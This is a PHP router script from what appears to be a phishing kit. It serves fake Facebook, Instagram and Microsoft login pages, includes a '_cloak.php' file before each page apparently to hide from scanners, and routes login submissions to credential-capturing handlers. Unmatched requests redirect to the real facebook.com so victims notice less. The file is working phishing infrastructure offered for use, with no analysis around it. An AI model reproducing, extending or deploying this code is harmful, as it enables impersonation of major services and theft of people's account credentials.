<?php
/**
 * PHP Built-in Server Router
 * 
 * This handles URL routing so that:
 * - / or /facebook/ → serves .server/www/facebook/index.php
 * - /instagram/ → serves .server/www/instagram/index.php
 * - /microsoft/ → serves .server/www/microsoft/index.php
 * - Static files (css, png, jpg) → served directly
 */

// Get the request URI
$uri = $_SERVER['REQUEST_URI'];
$path = parse_url($uri, PHP_URL_PATH);

// Remove trailing slash for consistency
$path = rtrim($path, '/');

// If the path is empty or just "/", redirect to default template (facebook)
if ($path === '' || $path === '/') {
    header('Location: /facebook/');
    exit();
}

// Get the DOCUMENT_ROOT (where PHP server is running from)
$doc_root = $_SERVER['DOCUMENT_ROOT'];

// ==============================
// Serve static files directly (CSS, images, etc.)
// ==============================
$static_extensions = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot', 'webp'];

$extension = pathinfo($path, PATHINFO_EXTENSION);
if (in_array($extension, $static_extensions)) {
    $static_file = $doc_root . $path;
    if (file_exists($static_file)) {
        // Set correct content type
        $mime_types = [
            'css' => 'text/css',
            'js' => 'application/javascript',
            'png' => 'image/png',
            'jpg' => 'image/jpeg',
            'jpeg' => 'image/jpeg',
            'gif' => 'image/gif',
            'svg' => 'image/svg+xml',
            'ico' => 'image/x-icon',
            'webp' => 'image/webp',
        ];
        if (isset($mime_types[$extension])) {
            header('Content-Type: ' . $mime_types[$extension]);
        }
        readfile($static_file);
        return true;
    }
    // If the static file doesn't exist in the requested path,
    // try looking in the template directory
    $parts = explode('/', trim($path, '/'));
    if (count($parts) >= 2) {
        $template_name = $parts[0];
        $filename = implode('/', array_slice($parts, 1));
        $alt_path = $doc_root . '/' . $template_name . '/' . $filename;
        if (file_exists($alt_path)) {
            if (isset($mime_types[$extension])) {
                header('Content-Type: ' . $mime_types[$extension]);
            }
            readfile($alt_path);
            return true;
        }
    }
}

// ==============================
// Serve PHP files
// ==============================
// Direct match: /facebook/login.php
$direct_file = $doc_root . $path;
if (file_exists($direct_file) && substr($direct_file, -4) === '.php') {
    require $direct_file;
    return true;
}

// Check if it's a template directory request: /facebook/ → serve /facebook/index.php
$index_file = $doc_root . $path . '/index.php';
if (file_exists($index_file)) {
    // Include the _cloak.php first if it exists
    $cloak_file = $doc_root . '/_cloak.php';
    if (file_exists($cloak_file)) {
        require_once $cloak_file;
    }
    require $index_file;
    return true;
}

// Check for index.html as fallback
$index_html = $doc_root . $path . '/index.html';
if (file_exists($index_html)) {
    readfile($index_html);
    return true;
}

// ==============================
// Handle login.php POST submissions
// ==============================
// Catch: /facebook/login, /facebook/login/, /login.php, etc.
if (strpos($path, '/login') !== false || strpos($path, 'login') !== false) {
    // Try to find login.php in various locations
    $login_paths = [
        $doc_root . $path . '.php',           // /facebook/login → /facebook/login.php
        $doc_root . dirname($path) . '/login.php',  // /facebook/something → /facebook/login.php
        $doc_root . '/facebook/login.php',
        $doc_root . '/instagram/login.php',
        $doc_root . '/microsoft/login.php',
    ];
    
    foreach ($login_paths as $login_file) {
        if (file_exists($login_file)) {
            require $login_file;
            return true;
        }
    }
}

// ==============================
// 404 fallback — redirect to real site
// ==============================
header('HTTP/1.0 404 Not Found');
header('Location: https://www.facebook.com');
exit();